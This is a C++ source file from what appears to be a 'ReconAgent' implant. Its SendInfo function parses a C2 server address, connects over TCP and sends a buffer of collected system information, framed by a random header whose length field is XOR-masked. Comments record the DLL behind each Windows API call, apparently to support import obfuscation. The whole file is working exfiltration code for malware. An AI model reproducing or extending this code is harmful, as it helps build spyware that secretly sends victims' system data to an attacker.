#include "framework.h"
#include "ReconAgent.h"
#include "SendSysInfo.h"

#pragma comment(lib, "ws2_32")

#pragma warning(disable: 4996)	//Add this to allow deprecated API to be used

BOOL SendInfo(HANDLE hHeap, LPSTR pszStrC2, LPBYTE pBuf2Send, DWORD dwSize2Send)
{
	BOOL bRet = FALSE;
	LPSTR pszStrServer, pszStrPort;
	TYPE_NET valPort;
	HCRYPTPROV hProv = NULL;
	/*/advapi32.dll/*/CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT);
	DWORD dwLen = /*/kernel32.dll/*/lstrlenA(pszStrC2);
	pszStrServer = (LPSTR)/*/kernel32.dll/*/HeapAlloc(hHeap, HEAP_ZERO_MEMORY, dwLen + 1);
	/*/kernel32.dll/*/lstrcpyA(pszStrServer, pszStrC2);
	pszStrPort = /*/shlwapi.dll/*/StrChrA(pszStrServer, ':');
	pszStrPort[0] = '\0';
	pszStrPort += 1;
	valPort.dwVal = /*/shlwapi.dll/*/StrToIntA(pszStrPort);
	WSADATA wsaData;
	int iResult = /*/ws2_32.dll/*/WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult == 0)
	{
		hostent* hostGot = /*/ws2_32.dll/*/gethostbyname(pszStrServer);
		if (hostGot)
		{
			SOCKET sock2Send = /*/ws2_32.dll/*/socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
			if (sock2Send != INVALID_SOCKET)
			{
				LPSTR pszTargetIP = *hostGot->h_addr_list;
				SOCKADDR addrTarget;
				/*/ntdll.dll/*/RtlZeroMemory(&addrTarget, sizeof(SOCKADDR));
				addrTarget.sa_family = AF_INET;
				addrTarget.sa_data[0] = valPort.chVal[1];
				addrTarget.sa_data[1] = valPort.chVal[0];
				addrTarget.sa_data[2] = pszTargetIP[0];
				addrTarget.sa_data[3] = pszTargetIP[1];
				addrTarget.sa_data[4] = pszTargetIP[2];
				addrTarget.sa_data[5] = pszTargetIP[3];
				int iResult = /*/ws2_32.dll/*/connect(sock2Send, &addrTarget, sizeof(SOCKADDR));//ws2_32.dll@
				if (iResult != SOCKET_ERROR)
				{
					PACKET_HEADER pktHdr;
					/*/advapi32.dll/*/CryptGenRandom(hProv, sizeof(PACKET_HEADER), (LPBYTE)&pktHdr);
					pktHdr.dwMagic[0] = dwSize2Send;
					SOCKADDR addrOut;
					dwLen = sizeof(SOCKADDR);
					/*/ws2_32.dll/*/getsockname(sock2Send, &addrOut, (int*)&dwLen);
					pktHdr.dwMagic[1] = *((LPDWORD)(addrOut.sa_data + 2));
					pktHdr.dwMagic[2] = 0xdcaf4a32;
					for (int i = 0;i < 4;i++)
						for (int j = i;j < 4;j++)
							pktHdr.dwMagic[i] ^= pktHdr.dwDummy[j];
					/*/ws2_32.dll/*/send(sock2Send, (LPCSTR)&pktHdr, sizeof(PACKET_HEADER), 0);
					/*/ws2_32.dll/*/send(sock2Send, (LPCSTR)pBuf2Send, dwSize2Send, 0);
					bRet = TRUE;
				}
				/*/ws2_32.dll/*/closesocket(sock2Send);
				sock2Send = INVALID_SOCKET;
			}
		}
		/*/ws2_32.dll/*/WSACleanup();
	}
	/*/advapi32.dll/*/CryptReleaseContext(hProv, 0);
	return bRet;
}